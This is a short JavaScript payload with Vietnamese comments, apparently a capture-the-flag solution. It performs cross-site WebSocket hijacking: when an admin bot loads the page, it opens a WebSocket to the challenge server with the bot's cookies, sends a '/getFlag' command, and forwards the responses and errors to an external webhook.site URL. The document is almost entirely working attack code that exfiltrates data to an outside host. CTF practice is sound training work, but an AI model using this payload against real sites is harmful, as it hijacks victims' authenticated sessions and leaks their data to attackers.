<script>
  // Tạo WebSocket connection đến server challenge
  const ws = new WebSocket("wss://wembsoncket.chal.cyberjousting.com");

  // Khi admin bot truy cập URL của chúng ta với cookie admin
  // WebSocket connection này sẽ được tạo với cookie admin
  ws.onopen = () => {
    // Gửi lệnh getFlag
    ws.send(JSON.stringify({ message: "/getFlag" }));
  };

  ws.onmessage = (event) => {
    // Chuyển flag đến server của chúng ta
    fetch("https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd?data=" + event.data,{mode: 'no-cors'});
  };
  
  ws.error = (error) => {
    // Chuyển flag đến server của chúng ta
    fetch("https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd?error=" + error,{mode: 'no-cors'});
  };
</script>
